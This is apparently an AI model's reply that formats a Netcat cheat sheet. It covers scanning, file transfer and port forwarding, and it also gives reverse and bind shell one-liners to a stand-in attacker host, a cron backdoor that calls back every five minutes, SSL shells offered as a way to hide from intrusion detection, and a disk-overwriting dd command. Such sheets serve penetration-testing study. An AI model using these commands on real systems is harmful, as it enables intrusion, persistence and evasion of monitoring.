This is a fantastic and comprehensive guide to Netcat.

I have formatted it to match the rest of your "Hacker's Knowledge Base". I kept all the technical details but organized it logically: Basics -> File Transfer -> Shells -> Port Forwarding -> Advanced Tricks.

Here is the complete code for your Netcat Cheat Sheet:

code
Markdown
download
content_copy
expand_less
# 🇨🇭 Netcat (nc) Cheat Sheet: The Swiss Army Knife

**"If you are stuck on an island with only one tool, choose Netcat."**

Netcat reads and writes data across network connections using TCP or UDP. It is the most versatile tool in a hacker's arsenal for debugging, transferring files, and creating backdoors.

---

## 📋 Table of Contents
- [Basic Syntax](#basic-syntax)
- [Connection Modes](#Connection Modes)
- [Port Scanning & Banner Grabbing](#port-scanning)
- [File Transfers](#file-transfers)
- [Shells (Reverse & Bind)](#shells)
- [Port Forwarding & Proxying](#port-forwarding)
- [Advanced Tricks](#advanced-techniques)
- [Ncat (The Modern Upgrade)](#ncat-modern-netcat)

---

## 🛠️ Basic Syntax
```bash
nc [options] [target] [port(s)]
Common Flags
Flag	Description
-l	Listen mode (Server).
-p	Specify source port (when listening).
-v	Verbose. (Always use -v or -vv).
-n	No DNS. (Faster scanning, numeric IPs only).
-u	UDP mode (Default is TCP).
-k	Keep listening after client disconnects.
-w	Timeout in seconds.
-e	Execute. (Dangerous! Runs a program after connection).
```
### 🔌 Connection Modes
Client Mode (Connect)

Act like a browser or telnet client.

```bash 
# Connect to a Web Server
nc example.com 80

# Connect to UDP (DNS)
nc -u 8.8.8.8 53

# Connect without DNS resolution (Faster)
nc -n 192.168.1.1 80
```
Server Mode (Listen)

Open a port and wait for data.

```bash
# Listen on port 1234
nc -lvp 1234

# Keep listening even after client disconnects (Chat server)
nc -lk -p 1234
```
### 🔍 Port Scanning & Banners

Netcat is a surprisingly good port scanner when Nmap isn't available.

Port Scanning
```bash 
# Scan a single port
nc -zv 192.168.1.1 80

# Scan a range (20-80)
nc -zv 192.168.1.1 20-80

# Fast scan (1 second timeout)
nc -zvw 1 192.168.1.1 1-1000
```
Banner Grabbing

See what software is running on a port.

```bash
# Grab SSH banner
nc 192.168.1.1 22

# Grab HTTP Banner (Send a request manually)
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc google.com 80
```
### 📂 File Transfers

Moving data between machines easily.

### 1. Receive File (Start this first!)

On the Destination machine:

```bash
nc -lvp 1234 > received_file.txt
```
### 2. Send File

On the Source machine:

```bash
nc <DESTINATION_IP> 1234 < file_to_send.txt
```
### 💡 Advanced Transfer Tricks
```bash
# Send entire directory (Tar pipe)
# Receiver:
nc -lvp 1234 | tar xvf -
# Sender:
tar cvf - /folder/path | nc <DEST_IP> 1234

# Clone a Hard Drive (Dangerous!)
# Receiver:
nc -lvp 1234 | dd of=/dev/sda
# Sender:
dd if=/dev/sda | nc <DEST_IP> 1234
```
### 🐚 Shells (Reverse & Bind)

The bread and butter of exploitation.

### 🔄 Reverse Shell (Target connects to YOU)

Attacker (You):
```bash
nc -lvp 4444
```

Victim (Target):

```bash
# Linux (Bash)
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1

# Windows (if nc is installed)
nc <ATTACKER_IP> 4444 -e cmd.exe

# Python One-Liner
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
### 🔗 Bind Shell (You connect to TARGET)

Victim (Target):

```bash
nc -lvp 4444 -e /bin/bash
```
Attacker (You):
```bash
nc <TARGET_IP> 4444
```
### 🪄 Upgrading to a TTY Shell

After catching a shell, it often feels "dumb." Make it interactive:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Then press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice. Now you have tab completion and arrows!
export TERM=xterm
```
### 🔀 Port Forwarding

Bouncing traffic through a compromised host.

Simple Forwarder (Linux Relay)

Forward local port 8080 to remote server port 80.

```bash
mkfifo pipe
nc -l -p 8080 < pipe | nc <REMOTE_IP> 80 > pipe
```
SSH Tunneling (Using Netcat as Proxy)

Config inside ~/.ssh/config to jump through a host.

```bash
ProxyCommand nc -X connect -x proxy_host:proxy_port %h %p
```
### 🧠 Advanced Techniques
### 💬 Chat Server

Two people can talk instantly.

```bash
# Person A
nc -lvp 1234
# Person B
nc <Person_A_IP> 1234
# Type messages and press Enter!
```
### 🌐 Instant Web Server

Host a single HTML page on port 80.

```bash
while true; do echo -e "HTTP/1.1 200 OK\r\n\r\n$(cat index.html)" | nc -l -p 80 -q 1; done
```
### 🚪 Backdoor (Persistent)

Make a shell come back every 5 minutes (Add to Crontab).

```bash
*/5 * * * * /bin/nc <ATTACKER_IP> 4444 -e /bin/bash
```
### 🚀 Ncat (Modern Netcat)

Ncat is the "Nmap Project" version of Netcat. It supports SSL!

SSL/Encrypted Shells

Standard Netcat sends data in cleartext (IDS can see commands). Ncat encrypts it.

```bash
# Attacker (Listen with SSL)
ncat -lvp 4444 --ssl

```

# Victim (Connect with SSL)
ncat <ATTACKER_IP> 4444 -e /bin/bash --ssl
Whitelisting Access

Only allow a specific IP to connect.

```bash
ncat -lvp 4444 --allow 192.168.1.50
```
### ⚠️ Security Warning

Cleartext: Standard nc is unencrypted. Anyone with Wireshark can see your files/commands. Use ncat --ssl or socat for encryption.

Firewalls: Reverse shells are often blocked by Egress filtering. Try common ports like 80, 443, or 53.

Authorization: Never install listeners on systems you do not own.
